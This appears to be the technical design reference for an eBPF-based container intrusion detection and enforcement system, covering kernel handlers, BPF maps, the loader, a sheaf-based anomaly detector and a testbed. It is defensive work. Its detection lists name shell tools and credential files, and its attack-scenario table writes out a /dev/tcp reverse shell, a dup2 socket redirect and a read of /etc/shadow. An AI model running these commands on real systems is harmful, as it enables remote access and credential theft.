**Step 1:** Read `ctx->args[1]` for syscall number.

**Step 2 — Container filter:** Read mount namespace inode from current task. Uses `bpf_probe_read_kernel` chain (D15a fix):

```c
struct task_struct *task = (struct task_struct *)bpf_get_current_task();
struct nsproxy *nsproxy = NULL;
bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &task->nsproxy);
struct mnt_namespace *mnt_ns = NULL;
bpf_probe_read_kernel(&mnt_ns, sizeof(mnt_ns), &nsproxy->mnt_ns);
unsigned int mnt_ns_inum = 0;
// ns_common at offset 0 in mnt_namespace, inum at offset 16 in ns_common
bpf_probe_read_kernel(&mnt_ns_inum, sizeof(mnt_ns_inum), (void *)mnt_ns + 16);
```

Compare against `host_ns[0]`. If equal, return 0 (host process — skip).

**Step 3 — verdict_map check:** `verdict_map.lookup(&cg)`. If `VERDICT_KILL` → `immediate_kill()` → return 0.

**Step 4 — Cgroup inheritance:** Check `pending_cgroup_inherit[pid_tgid]`. If present, copy `behavior_state` from old cgroup to new cgroup (D10 fix).

**Step 5 — Bigram CMS update:**

Window reset check: if `now - sketch->window_start > WINDOW_NS`, reset all counters using `*(volatile u32 *)&counter = 0` (D15b fix) with `#pragma unroll` (D15c fix).

Noise filter: check `is_noise_syscall(syscall_nr)`. If noise, execute tail-call but do NOT advance `prev_idx` (D6).

CMS update:
```c
u32 curr_idx = syscall_to_idx((u32)syscall_nr);
u32 prev_idx = sketch->prev_idx;
if (prev_idx > 24) prev_idx = 24;  // D15f defensive bound
u32 bigram_key = prev_idx * TOP_SYSCALLS + curr_idx;
#pragma unroll
for (int i = 0; i < CMS_ROWS; i++) {
    u32 hash = (bigram_key * cms_prime(i) + cms_seed(i)) & CMS_COL_MASK;
    sketch->counters[i * CMS_COLS + hash] += 1;  // flat array (D15b)
}
sketch->total_count += 1;
sketch->prev_idx = curr_idx;
```

Cold path (sketch == NULL): fall through (D5).

**Step 6:** `prog_array.call(ctx, (u32)syscall_nr)`. Tail-call to handler registered at syscall index.

### 6.6 Handler: handle_dup2 (fd-Type Invariant)

**Syscalls:** 33 (dup2), 292 (dup3)

**Logic:**
1. Read `rdi` (oldfd) and `rsi` (newfd) via `bpf_probe_read_kernel`.
2. Bound check: `newfd` must be 0, 1, or 2 (stdin/stdout/stderr).
3. Bound check: `oldfd` must be in [0, MAX_FD) (D15e verifier fix).
4. Traverse `task→files→fdt→fd[oldfd]→f_inode→i_mode` via `bpf_probe_read_kernel`.
5. Check `(i_mode & 0xF000) == 0xC000` (S_IFSOCK).
6. If socket: set `BIT_FD_REDIRECT`, `bit_ts[6]`, emit `ALERT_FD_REDIRECT` to `alerts_rb`, call `immediate_kill()`.

**`alert.extra` encoding:** `(oldfd << 32) | newfd` — for logging which fd was redirected.

**ENFORCE_MODE:** `bpf_send_signal(9)` is conditionally compiled. In monitor/calibrate mode, the alert is emitted but no kill is issued.

### 6.7 Handler: handle_fork (Fork Acceleration)

**Syscalls:** 56 (clone), 435 (clone3)

**Rate state:**
```c
struct rate_state {
    u64 window_start;     // ns timestamp of current 1s window
    u64 count;            // forks in current window
    u64 prev_count;       // forks in previous window
    u64 prev_prev_count;  // forks two windows ago
};
```

**Logic:** On each fork, update the rate state. When `count > 50`:
```c
s64 d2 = (s64)rate - 2*(s64)prev + (s64)prev_prev;
if (d2 > 0 && rate > prev && prev > prev_prev) {
    // Fork acceleration detected — exponential growth
    immediate_kill();
}
```

Hard ceiling: `if (rate > 500) { immediate_kill(); }` — defense in depth.

### 6.8 Handler: handle_execve (Shell Binary Matching)

**Syscall:** 59

Reads filename from `regs->di` via `bpf_probe_read_kernel`, then `bpf_probe_read_user_str`. Extracts basename by finding last `/`. Matches against: `sh`, `bash`, `dash`, `nc`, `ncat`, `zsh`.

**On match:** Sets `BIT_SHELL_SPAWN`, `bit_ts[0]`, emits `ALERT_REVERSE_SHELL` to `alerts_rb`, calls `alert_only()` (Tier 3 decides enforcement, not immediate kill — shell execution alone is insufficient evidence).

### 6.9 Handler: handle_file (Sensitive File Detection)

**Syscall:** 257 (openat)

Reads pathname from `regs->si` (second argument of openat: `openat(dirfd, pathname, flags, mode)`).

```c
bpf_probe_read_kernel(&__path_raw, sizeof(__path_raw), &regs->si);
char path[64];  // 64 bytes only — stack limit fix (D15d)
bpf_probe_read_user_str(path, sizeof(path), (void *)__path_raw);
```

Path matching via byte-level comparison (no strcmp in eBPF):

| Path | Bytes 0–7 | Bit Set |
|------|----------|---------|
| `/etc/shadow` | `2f 65 74 63 2f 73 68 61` | BIT_SENSITIVE_FILE (bit2) |
| `/proc/1/ns/...` | `2f 70 72 6f 63 2f 31 2f` | BIT_NS_PROBE (bit3) |
| `/var/run/secrets` | `2f 76 61 72 2f 72 75 6e` + `2f 73 65 63` | BIT_SENSITIVE_FILE |
| `/proc/self/environ` | `2f 70 72 6f 63 2f 73 65` + `6c 66 2f 65` | BIT_SENSITIVE_FILE |

**Enforcement:** Alert only (`alerts_rb` emit, no immediate kill). Tier 3 decides kill based on compound behavior (novel_edge + sensitive_file = attack chain). Prevents killing benign processes that read `/etc/shadow` during startup (e.g., PAM modules).

**Known limitation (D19):** Does not cover `open()` syscall 2. Some container images use busybox `cat` which calls `open()` instead of `openat()`. Fix: add syscall 2 to TAIL_CALL_MAP with `handle_file_open` reading `rdi` instead of `rsi`.

### 6.10 Handler: handle_privesc (Privilege Escalation)

**Syscalls:** 101 (ptrace), 105 (setuid), 272 (unshare), 308 (setns)

**Dispatching logic:**

```c
if (syscall_nr == 272) {  // unshare
    if (flags & CLONE_NEWCGROUP)  → pending_cgroup_inherit (D10, no alert)
    if (flags & CLONE_NEWNS || flags & CLONE_NEWUSER) → BIT_PRIVESC + alert_only()
    return 0;
}

if (syscall_nr == 308 || syscall_nr == 101) {  // setns, ptrace
    // Always suspicious in container context
    → BIT_PRIVESC + alert_only()
    return 0;
}

// setuid (105) — only alert on setuid(0) from non-root
if (current_uid == 0) return 0;   // already root, ignore
if (target_uid != 0) return 0;    // not escalating to root, ignore
→ BIT_PRIVESC + alert_only()
```

`alert.extra` = syscall_nr, so downstream analysis can distinguish ptrace vs. unshare vs. setns.

---

## 7. TIER 2 KERNEL-SPACE

### 7.1 Probe B: tcp_v4_connect

Two BCC functions: `trace_connect_entry` (kprobe) and `trace_connect_return` (kretprobe).

**Entry:** Stash `struct sock *` from `PT_REGS_PARM1(ctx)` into `connect_sk_stash[pid_tgid]` (LRU_HASH — D7).

**Return:**
```c
int ret = PT_REGS_RC(ctx);
if (ret != 0) return 0;  // only track successful connections
```

Read destination from socket:
```c
u32 dst_addr = 0;
u16 dst_port = 0;
bpf_probe_read_kernel(&dst_addr, sizeof(dst_addr), &sk->__sk_common.skc_daddr);
bpf_probe_read_kernel(&dst_port, sizeof(dst_port), &sk->__sk_common.skc_dport);
dst_port = ntohs(dst_port);
```

Resolve `dst_addr` to `dst_cg` via `ip_to_cgroup`. If not in map (external IP), return 0.

**Two-hop check with lazy expiry:**
```c
if (src_state->flags & BIT_SHELL_SPAWN) {
    if (now - src_state->bit_ts[0] < TWOHOP_WINDOW_NS)
        should_kill = 1;
    else
        src_state->flags &= ~BIT_SHELL_SPAWN;  // lazy expiry
}
if (src_state->flags & BIT_FD_REDIRECT) {
    if (now - src_state->bit_ts[6] < TWOHOP_WINDOW_NS)
        should_kill = 1;
    else
        src_state->flags &= ~BIT_FD_REDIRECT;
}
```

If `should_kill`: emit `ALERT_TWO_HOP` to `alerts_rb`, call `alert_only()`.

Emit `EVENT_CONNECTION` to `telemetry_rb` (separate from alerts_rb — D8). `conn.extra = (dst_addr << 32) | dst_port`. `conn.flags = dst_cg`.

### 7.2 Probe C: sched_process_exec

`TRACEPOINT_PROBE(sched, sched_process_exec)` — fires on every exec in any container. Emits `EVENT_EXEC` (type=101) to `telemetry_rb` for process lineage tracking by Tier 3.

### 7.3 Enforcement Kprobes

Three additional kprobes attached only in `--mode enforce`:

**`enforce_connect` on `__x64_sys_connect`:**
- Reads `sockaddr_in` from `ctx->si` (user pointer, `bpf_probe_read_user`)
- Checks `enforce_level_map[cg]` for TTL and level
- Level ≥ DENY: checks `deny_connect_map[cg, dst_packed]` → `bpf_override_return(errno_val)`
- Level ≥ THROTTLE: checks `rate_limit_map[cg, dst_packed]` → rate throttle
- Level ≥ FIREWALL: checks `fw_allow_map[cg, dst_packed]` → deny if not present

**`enforce_openat` on `__x64_sys_openat`:**
- Reads pathname from `ctx->si`, hashes first 16 bytes via FNV-1a
- Checks `deny_open_map[cg, path_hash]` → `bpf_override_return(-EACCES)`

**`enforce_execve` on `__x64_sys_execve`:**
- Reads filename from `ctx->di`, hashes first 16 bytes
- Checks `deny_exec_map[cg, path_hash]` → `bpf_override_return(-EPERM)`

**`bpf_override_return()` requirements:**
- `CONFIG_BPF_KPROBE_OVERRIDE=y` (verified on testbed kernel)
- Target function in error injection whitelist (verified: `__x64_sys_connect`, `__x64_sys_openat`, `__x64_sys_execve`)
- Must be kprobe type (not raw tracepoint)

---

## 8. BPF MAP REFERENCE

### 8.1 Core Maps

| Map Name | Type | Key | Value | Capacity | Purpose |
|----------|------|-----|-------|----------|---------|
| `host_ns` | ARRAY | u32 | u32 | 1 | Host mount NS inode, written once at startup |
| `prog_array` | PROG_ARRAY | u32 (syscall_nr) | prog_fd | 512 | Tail-call dispatch table |
| `verdict_map` | HASH | u64 (cg_id) | u32 | 256 | Tier 3 → Tier 1 kill feedback |
| `container_behavior` | HASH | u64 (cg_id) | behavior_state (88B) | 256 | Per-container behavioral bitfield |
| `rate_map` | HASH | u64 (cg_id) | rate_state (32B) | 256 | Fork rate tracking |
| `bigram_sketch_map` | HASH | u64 (cg_id) | bigram_sketch (2072B) | 256 | Syscall bigram CMS |
| `ip_to_cgroup` | HASH | u32 (IPv4) | u64 (cg_id) | 256 | Container IP → cgroup_id |
| `connect_sk_stash` | **LRU_HASH** | u64 (pid_tgid) | u64 (sock\*) | **4096** | Probe B entry/return bridge |
| `pending_cgroup_inherit` | HASH | u64 (pid_tgid) | u64 (old_cg) | 256 | unshare(NEWCGROUP) tracking |
| `alerts_rb` | RINGBUF | — | alert_t (40B) | **64KB** | High-priority security alerts |
| `telemetry_rb` | RINGBUF | — | alert_t (40B) | **256KB** | Connection/exec telemetry |
| `stats` | ARRAY | u32 | u64 | 16 | Diagnostic counters |

### 8.2 Enforcement Maps (loaded in enforce mode)

| Map Name | Type | Key | Value | Capacity | Purpose |
|----------|------|-----|-------|----------|---------|
| `enforce_level_map` | HASH | u64 (cg_id) | enforce_state (24B) | 256 | Per-container enforcement level + TTL |
| `deny_connect_map` | HASH | deny_connect_key (16B) | deny_connect_val (16B) | 1024 | Specific (cg, dst_ip, port) denials |
| `deny_open_map` | HASH | deny_open_key (16B) | deny_open_val (16B) | 256 | File path prefix (hash) denials |
| `deny_exec_map` | HASH | deny_exec_key (16B) | deny_exec_val (16B) | 256 | Binary path prefix (hash) denials |
| `rate_limit_map` | HASH | rate_limit_key (16B) | rate_limit_val (32B) | 512 | Per-destination rate caps |
| `fw_allow_map` | HASH | fw_allow_key (16B) | u32 | 2048 | Calibrated-destination allowlist |

### 8.3 Key Struct Layouts (ctypes-critical, Python must match exactly)

**`struct alert_t` (40 bytes):**
```c
struct alert_t {
    u32 type;        // offset 0
    u32 pid;         // offset 4
    u64 cgroup_id;   // offset 8
    u64 timestamp;   // offset 16
    u64 flags;       // offset 24  (behavior_state.flags snapshot)
    u64 extra;       // offset 32  (type-specific, see codes above)
};
```

**`struct enforce_state` (24 bytes):**
```c
struct enforce_state {
    u32 level;       // offset 0  (ENFORCE_* constant)
    u32 _pad;        // offset 4
    u64 expire_ns;   // offset 8  (CLOCK_MONOTONIC ns — 0 = never expires)
    u64 set_ns;      // offset 16
};
```

**`struct deny_connect_key` (16 bytes):**
```c
struct deny_connect_key {
    u64 cgroup_id;   // offset 0
    u64 dst_packed;  // offset 8  (dst_ip<<32 | dst_port<<16)
};
```

---

## 9. LOADER

**File:** `loader.py` (repository root, run as root)

### 9.1 Startup Sequence

```
1. Register signal handlers (SIGTERM, SIGINT) and atexit cleanup
2. load_bpf(enforce) → BCC compile causaltrace_bcc.c with -DENFORCE_MODE=0/1
3. populate_host_ns(b) → b.get_table("host_ns")[0] = os.stat("/proc/self/ns/mnt").st_ino
4. setup_tail_calls(b) → for each (syscall_nr, fn_name) in TAIL_CALL_MAP:
       fn = b.load_func(fn_name, BPF.RAW_TRACEPOINT)
       prog_array[syscall_nr] = fn.fd
5. attach_probes(b, enforce) →
       b.attach_kprobe(event="tcp_v4_connect", fn_name="trace_connect_entry")
       b.attach_kretprobe(event="tcp_v4_connect", fn_name="trace_connect_return")
       if enforce:
           b.attach_kprobe(event="__x64_sys_connect", fn_name="enforce_connect")
           b.attach_kprobe(event="__x64_sys_openat",  fn_name="enforce_openat")
           b.attach_kprobe(event="__x64_sys_execve",  fn_name="enforce_execve")
6. b["alerts_rb"].open_ring_buffer(handle_alert)
7. DockerEventListener thread start
8. if --calibrate: run calibrate_runner.run_calibration(b)
   else: CausalTraceDaemon(b, mode).run()
```

### 9.2 TAIL_CALL_MAP

```python
TAIL_CALL_MAP = {
    56:  "handle_fork",    # clone
    435: "handle_fork",    # clone3 (new interface)
    59:  "handle_execve",
    257: "handle_file",    # openat — NOTE: does NOT cover open(2) (D19)
    105: "handle_privesc", # setuid
    308: "handle_privesc", # setns
    272: "handle_privesc", # unshare
    101: "handle_privesc", # ptrace
    33:  "handle_dup2",    # dup2
    292: "handle_dup2",    # dup3
}
```

### 9.3 Alert Callback

```python
def handle_alert(ctx, data, size):
    names = {
        1: "FORK_BOMB",  2: "REVERSE_SHELL", 3: "SENSITIVE_FILE",
        4: "PRIVESC",    5: "FD_REDIRECT",   6: "FORK_ACCEL",
        7: "TWO_HOP",    8: "NS_ESCAPE",
        20: "ENFORCE_DENY", 21: "ENFORCE_THROTTLE"
    }
    evt = ctypes.cast(data, ctypes.POINTER(AlertT)).contents
    name = names.get(evt.type, f"TYPE_{evt.type}")
    print(f"[ALERT] {name} | cgroup={evt.cgroup_id} | pid={evt.pid} | "
          f"flags=0x{evt.flags:04x}")
```

### 9.4 Cleanup

```python
def cleanup_bpf():
    _bpf_obj.detach_kprobe(event="tcp_v4_connect")
    _bpf_obj.detach_kretprobe(event="tcp_v4_connect")
    for event in ["__x64_sys_connect", "__x64_sys_openat", "__x64_sys_execve"]:
        _bpf_obj.detach_kprobe(event=event)  # no-op if not attached
    _bpf_obj.cleanup()  # releases all eBPF programs and maps
```

This is critical: without cleanup, eBPF programs remain loaded after the loader exits. On re-launch, the kernel rejects duplicate kprobe attachments with `EEXIST`. Always call `sudo python3 loader.py --cleanup` if the loader crashed.

---

## 10. TIER 3 SHEAF DAEMON

### 10.1 daemon_main.py: CausalTraceDaemon

5-second detection cycle loop:
1. Poll `alerts_rb` and `telemetry_rb` ring buffers
2. Read `bigram_sketch_map` for all registered containers
3. Read `container_behavior` for all containers
4. Collect connection events from this cycle
5. Call `SheafDetector.detect_cycle(sketches, behaviors, connections)`
6. If verdict.action == KILL: `EnforcementEngine.enforce(verdict)`
7. Write verdict to `results/paper/raw_causaltrace/verdicts.jsonl`
8. TTL sweep: `enforcement_engine.sweep_expired_rules()`

### 10.2 signal_extractor.py: d=74 Signal Vector

```
Signal composition:
  dims  [0: 3)  Rényi entropy H_α(p) for α ∈ {0.5, 1.0, 2.0}      = 3
  dims  [3:53)  PCA projection of 625 bigrams → 50 dims             = 50
  dims [53:73)  Transition marginals (max of each source row, top 20) = 20
  dim   [73]    Total syscall rate: count / 5.0 seconds              = 1
  ──────────────────────────────────────────────────────────────────────
  TOTAL                                                               = 74
```

**CMS minimum estimate:**
```python
def reconstruct_bigrams(sketch):
    estimates = np.zeros((MAX_BIGRAMS, CMS_ROWS))
    for bg_idx in range(MAX_BIGRAMS):
        for row in range(CMS_ROWS):
            col = (bg_idx * CMS_PRIMES[row] + CMS_SEEDS[row]) & CMS_COL_MASK
            estimates[bg_idx, row] = sketch.counters[row, col]
    return estimates.min(axis=1)  # CMS minimum — least biased estimate
```

**Rényi entropy:**
```python
H_α(p) = (1/(1-α)) * log₂(Σ p_i^α)
# α=0.5: emphasizes rare events (anomaly-sensitive)
# α=1.0: Shannon entropy (baseline profile)
# α=2.0: emphasizes common events (dominant syscall characterization)
```

**PCA projection:** `bigram_pca = cal_stats.pca_components @ (raw_bigrams - cal_stats.pca_mean)` — projects 625-dim bigram space to 50 dims. Calibration PCA retains >95% of variance.

**Transition marginals:** Reshape bigrams to (24,24) matrix, compute row-normalized transition probability matrix, take `max` along columns (most deterministic next step). Top 20 rows returned.

### 10.3 whitener.py: Feature Whitening

```python
x_whitened = (x_raw - μ_calibration) / max(σ_calibration, ε=1e-6)
```

ε=1e-6 floor prevents division by zero on zero-variance dimensions. Do NOT apply to invariant bits (D3).

### 10.4 calibrate.py: SheafCalibrator

**Step 1 — PCA:** Pool all bigram vectors from all containers over calibration period. Fit PCA(n_components=50). Save `pca.components_` (50, 625) and `pca.mean_` (625,).

**Step 2 — Per-container whitening:** For each container, compute mean and std over T calibration windows. Store `FeatureWhitener` objects.

**Step 3 — CCA restriction maps:** For each observed edge (u, v) at each lag ∈ {0, 1, 2}:

```python
cca = CCA(n_components=50)
cca.fit(X_u_lagged, X_v_lagged)
F_u = cca.x_rotations_.T  # (50, 74) — projects u's signal to shared space
F_v = cca.y_rotations_.T  # (50, 74) — projects v's signal to shared space
restriction_maps[(u, v, lag)] = (F_u, F_v)
```

**Step 4 — Mahalanobis thresholds:** For each edge × lag, compute residuals `{F_u @ x_u[t] - F_v @ x_v[t]}` over calibration. Fit covariance. Threshold = μ + 4σ (4-sigma because Mahalanobis distances follow chi-squared, not Gaussian; at k=50 dims, 3-sigma gives too many false positives).

**Step 5 — Global Rayleigh quotient threshold:** Compute `E(x) = x^T L_F x / ||x||²` for all calibration windows. Global threshold = μ + 4σ.

**Saved to disk:** `restriction_maps.npz`, `edge_thresholds.json`, `global_threshold.json`, `calibrated_edges.json`, `whiteners.pkl`, `pca.pkl`

### 10.5 ema_buffer.py: EMA Signal Buffer

```python
x_ema(t) = 0.2 * x_raw(t) + 0.8 * x_ema(t-1)
```

- α=0.2: 80% momentum. Slow-drip anomaly converges to its true amplitude in ~35s.
- EMA threshold = 0.7 × raw threshold (tighter — D12).
- Separate `EMASignalBuffer` per container (dict[cg_id → np.ndarray]).

### 10.6 sheaf_detector.py: SheafDetector.detect_cycle()

**Stage 1 — Novel-edge detection and 30s window accumulation (D14):**

```python
# Per-cycle novel alerts
novel_alerts = [NovelEdgeAlert(src, dst, port)
                for conn in connections
                if (conn.src_cg, conn.dst_cg, conn.dst_port) not in calibrated_edges]

# Accumulate into 30s sliding window
now = time.monotonic()
for alert in novel_alerts:
    self.novel_edge_window.append((now, alert))  # deque maxlen=6
while self.novel_edge_window and (now - self.novel_edge_window[0][0]) > 30.0:
    self.novel_edge_window.popleft()

windowed_unique = {(a.src, a.dst) for _, a in self.novel_edge_window}
effective_novel_count = max(len(novel_alerts), len(windowed_unique))
```

**Stage 2 — Signal extraction and whitening:** Per-container CMS → d=74 raw signal → whitened signal → EMA signal.

**Stage 3 — Sheaf Laplacian test:**

For each calibrated edge (u, v), for each lag ∈ {0,1,2}:
```python
diff = F_u @ x_u - F_v @ x_v              # (50,)
energy = diff @ cov_inv @ diff             # Mahalanobis distance
max_energy = max(max_energy, energy)       # take maximum over lags
```

Global Rayleigh quotient: `E = total_energy / ||x_global||²`

**Stage 4 — Eigenmode analysis:**

```python
L_F[i_u*d:(i_u+1)*d, i_u*d:(i_u+1)*d] += F_u.T @ F_u    # diagonal
L_F[i_u*d:(i_u+1)*d, i_v*d:(i_v+1)*d] -= F_u.T @ F_v    # off-diagonal
```

Project anomalous signal onto eigenvectors of L_F to determine which attack mode was excited.

**Stage 5 — Semantic label engine:**

Priority-ordered rule set (first match wins):

| Bits Set | Additional Condition | Label | Severity |
|----------|---------------------|-------|----------|
| bit6 + bit1 | — | Reverse shell + lateral movement | CRITICAL |
| bit2 + bit5 | — | Credential theft → exfiltration | CRITICAL |
| bit2 | novel ≥ 1 | Data exfiltration via novel channel | CRITICAL |
| bit3 + bit4 | — | Container escape attempt | HIGH |
| bit7 | — | Fork bomb / resource exhaustion | HIGH |
| bit0 + bit1 | — | Shell spawn + lateral connection | HIGH |
| bit0 | novel ≥ 1 | Suspicious execution + novel connection | HIGH |
| — | novel ≥ 3 (window) | Multi-target SSRF | HIGH |
| — | novel ≥ 1 + edge anomaly | Novel connection + anomalous coupling | HIGH |
| — | novel = 2 (window) | Multiple uncalibrated connections | MEDIUM |
| — | novel = 1 (window) | Uncalibrated connection (monitoring) | LOW |
| — | edge anomalies | Unknown anomalous inter-container coupling | MEDIUM |

**Stage 6 — Verdict and enforcement:**

```python
severity = label.severity
action = VERDICT_ALLOW if severity == 'LOW' else VERDICT_KILL
```

LOW severity → observe only, no enforcement (D13 compound confirmation).

Verdict written to `verdicts.jsonl` with `wall_ts_iso`, `severity`, `novel_edges`, `label`, `reason` (includes `(window=N)` annotation when windowed accumulation is active).

---

## 11. ENFORCEMENT ENGINE

**File:** `tier3/enforcement_engine.py`

### 11.1 Level Selection Logic

```python
def select_enforcement_level(verdict) -> int:
    if 'reverse shell' in label or 'container escape' in label:
        return ENFORCE_QUARANTINE  # L6
    if severity == 'LOW':
        return ENFORCE_OBSERVE     # L0
    if severity == 'CRITICAL':
        return ENFORCE_FIREWALL    # L4
    if n_novel >= 3:
        return ENFORCE_FIREWALL    # L4 — multi-target SSRF
    if n_novel >= 1 and n_edge_anom > 0:
        return ENFORCE_FIREWALL    # L4 — compound confirmation
    if n_edge_anom > 0 and n_novel == 0:
        return ENFORCE_THROTTLE    # L3 — sheaf anomaly only
    if severity == 'HIGH' and n_novel >= 1:
        return ENFORCE_DENY        # L1
    if severity == 'MEDIUM' and n_novel >= 2:
        return ENFORCE_DENY        # L1
    return ENFORCE_OBSERVE         # L0
```

### 11.2 Rule Writing

**deny_connect:** Writes `deny_connect_map[(cg, dst_packed)] = {errno=-ECONNREFUSED, expire_ns}`. TTL=300s default.

**deny_open:** FNV-1a hash of path prefix (first 16 bytes). Writes `deny_open_map[(cg, path_hash)] = {errno=-EACCES, expire_ns}`.

**set_firewall:** Populates `fw_allow_map` with all calibrated edges for the container. Writes `enforce_level_map[cg] = {level=FIREWALL, expire_ns}`. All other destinations denied by `enforce_connect`.

**quarantine:** `enforce_level_map[cg] = {level=QUARANTINE, expire_ns}` + Docker network disconnect via Docker SDK.

**Don't downgrade:** `effective_level = max(current_level, new_level)` — once quarantined, can only return to normal via TTL expiry.

### 11.3 TTL Sweep

Called each detection cycle. Iterates `active_rules`, removes entries older than their `ttl_seconds`. Also sweeps `enforce_level_map` for expired entries. Logs count of expired vs. active rules.

### 11.4 Path Hash Function

```python
def fnv1a_16(path_bytes: bytes) -> int:
    """FNV-1a hash of first 16 bytes — MUST match BPF kernel code."""
    h = 14695981039346656037  # FNV offset basis
    padded = (path_bytes[:16] + b'\x00' * 16)[:16]
    for b in padded:
        h ^= b
        h = (h * 1099511628211) & 0xFFFFFFFFFFFFFFFF
    return h
```

---

## 12. DOCKER EVENT LISTENER

**File:** `infra/docker_event_listener.py`

Runs as a daemon thread inside the loader process. Maintains `ip_to_cgroup` and `bigram_sketch_map` as containers start and stop.

**Container registration:**
1. Docker API inspect → get init PID
2. Read `/proc/<pid>/cgroup` → find cgroupv2 hierarchy (line starting with `0:`)
3. Resolve cgroup path: `/sys/fs/cgroup/<relative_path>`
4. `stat(full_path).st_ino` → cgroup_id (this is what `bpf_get_current_cgroup_id()` returns)
5. Write `ip_to_cgroup[ip_int] = cgroup_id`
6. Pre-populate `bigram_sketch_map[cgroup_id] = zeroed_sketch`

**Why pre-populate bigram_sketch_map:** The `struct bigram_sketch` is 2072 bytes. In the BPF cold path, stack-allocating this struct would require `bpf_map_update_elem()` with a stack-local 2072-byte struct, which exceeds the 512-byte BPF stack limit and is rejected by the verifier. Pre-populating from userspace avoids this entirely.

**Container unregistration:** Delete `ip_to_cgroup[ip_int]` and `bigram_sketch_map[cgroup_id]` on container stop/die events.

---

## 13. MATHEMATICAL REFERENCE

### 13.1 Signal Vector d=74

Let container c have bigram CMS B_c at time t. Define:

**Bigram reconstruction:** For bigram (i,j) where i,j ∈ {0,...,24}:
```
b̂_{ij} = min_{r=0}^{3}  B_c[r, (idx(i,j) · prime_r + seed_r) mod 128]
```
where `idx(i,j) = i · 25 + j`.

**Probability distribution:** `p = b̂ / Σ b̂`

**Rényi entropy:** `H_α(p) = (1/(1-α)) log₂(Σ_i p_i^α)`, evaluated at α ∈ {0.5, 1.0, 2.0}

**PCA projection:** Let W ∈ ℝ^{50×625} and μ ∈ ℝ^{625} be learned during calibration.
`z_pca = W(b̂ - μ)  ∈ ℝ^{50}`

**Transition marginals:** Reshape p to (24,24) matrix P. Row-normalize: `T_{ij} = P_{ij} / Σ_k P_{ik}`. Marginal: `m_i = max_j T_{ij}`. Take m_{0:20} ∈ ℝ^{20}.

**Rate:** `ρ = Σ b̂ / 5.0  ∈ ℝ`

**Signal vector:**
`x_c(t) = [H_{0.5}, H_{1.0}, H_{2.0}, z_{pca,1}, ..., z_{pca,50}, m_1, ..., m_{20}, ρ]^T  ∈ ℝ^{74}`

**Whitening:** `x̃_c(t) = (x_c(t) - μ̄_c) / σ̄_c` where μ̄_c, σ̄_c are per-container calibration statistics, σ̄_c ≥ ε=10^{-6}.

### 13.2 Sheaf Construction

**Container communication graph:** G = (V, E) where V = containers, E = observed TCP connections.

**Sheaf over G:** For each container v, stalk F(v) = ℝ^{74}. For each edge e=(u,v), restriction maps F_{u⊳e}: ℝ^{74} → ℝ^{50} and F_{v⊳e}: ℝ^{74} → ℝ^{50} learned by CCA.

**CCA learning:** Find F_u, F_v such that correlation(F_u x̃_u, F_v x̃_v) is maximized over calibration windows:
```
(F_u, F_v) = CCA(X̃_u, X̃_v, n_components=50)
```
F_u = cca.x_rotations_.T ∈ ℝ^{50×74}, F_v = cca.y_rotations_.T ∈ ℝ^{50×74}.

**Multi-lag:** Learn (F_u^{(ℓ)}, F_v^{(ℓ)}) for ℓ ∈ {0,1,2} using aligned pairs (x̃_u[t], x̃_v[t+ℓ]).

### 13.3 Sheaf Laplacian

**Block matrix construction:**
```
(L_F)_{vv} = Σ_{e:v⊳e}  F_{v⊳e}^T F_{v⊳e}         (d×d diagonal block)
(L_F)_{uv} = -F_{u⊳e}^T F_{v⊳e}                    (d×d off-diagonal, e=(u,v))
```
Dimension: (|V|·d) × (|V|·d) = (3·74)×(3·74) = 222×222 for 3 containers.

### 13.4 Mahalanobis Edge Energy

Normal residuals during calibration:
```
δ_e^{(ℓ)}(t) = F_u^{(ℓ)} x̃_u(t) - F_v^{(ℓ)} x̃_v(t+ℓ)  ∈ ℝ^{50}
```

Covariance: `Σ_e^{(ℓ)} = Cov({δ_e^{(ℓ)}(t)}_t) + 10^{-6}I`

Threshold: `τ_e^{(ℓ)} = E[||δ||²_Σ] + 4·Std[||δ||²_Σ]` (4-sigma)

At runtime:
```
E_e^{raw}(t) = max_{ℓ∈{0,1,2}} (F_u^{(ℓ)} x̃_u(t) - F_v^{(ℓ)} x̃_v(t))^T (Σ_e^{(ℓ)})^{-1} (...)
E_e^{ema}(t) = ||F_u^{(0)} x̃_u^{ema}(t) - F_v^{(0)} x̃_v^{ema}(t)||²_{Σ}
```

Alert if `E_e^{raw} > τ_e^{raw}` OR `E_e^{ema} > 0.7·τ_e^{raw}`.

### 13.5 Global Rayleigh Quotient

```
E_global(t) = (x̃^T L_F x̃) / ||x̃||²
```
where x̃ = [x̃_{c1}^T, x̃_{c2}^T, ..., x̃_{cn}^T]^T ∈ ℝ^{n·74}.

Alert if `E_global > τ_global` (4-sigma on calibration).

### 13.6 EMA Accumulator

```
x̃^{ema}_c(t) = 0.2 · x̃_c(t) + 0.8 · x̃^{ema}_c(t-1)
```

Steady-state for constant anomaly Δ: `x̃^{ema,ss} = Δ` (DC gain = 1.0).
Time to 80% steady-state: `t_{80%} = log(0.2) / log(0.8) ≈ 7` cycles ≈ 35 seconds.

---

## 14. TESTBED AND ATTACK SCENARIOS

### 14.1 Testbed

**Docker Compose:** `testbed-production/docker-compose.production.yml`

**Network:** `prod-net` bridge, subnet `172.22.0.0/16`, IPv6 disabled.

**Containers:**

| Container | IP | Role |
|-----------|-----|------|
| ct-prod-webapp-a | 172.22.0.10 | Flask webapp |
| ct-prod-webapp-b | 172.22.0.11 | Flask webapp replica |
| ct-prod-api-gw | 172.22.0.7 | API gateway (nginx) |
| ct-prod-postgres | 172.22.0.6 | PostgreSQL DB |
| ct-prod-redis | 172.22.0.20 | Redis cache |
| ct-prod-nginx | 172.22.0.2 | Load balancer |
| ct-prod-user | 172.22.0.* | Attacker-controlled (has bash + python3) |

### 14.2 Attack Scenarios (Safe Evaluation Suite)

**Script:** `/tmp/run_scenarios_safe.sh`

| ID | Scenario | Command | CausalTrace Detection |
|----|---------|---------|----------------------|
| S2a | Bash reverse shell | `exec 5<>/dev/tcp/$HOST/9991; cat <&5 \| /bin/sh 2>&5 >&5` | REVERSE_SHELL (execve) + FD_REDIRECT (dup2) |
| S2b | Python dup2 | `os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)` | FD_REDIRECT × 3 → SIGKILL |
| S3 | Sensitive file | `cat /etc/shadow` | SENSITIVE_FILE via `open()` syscall 2 → `handle_file_open` (D19 fixed) |
| S4 | Fork bomb | cmdline marker only (safe) | FORK_ACCEL (real d2 test confirmed in prior runs) |
| S5 | NS unshare | `unshare -U -r id` | PRIVESC (unshare 272) |
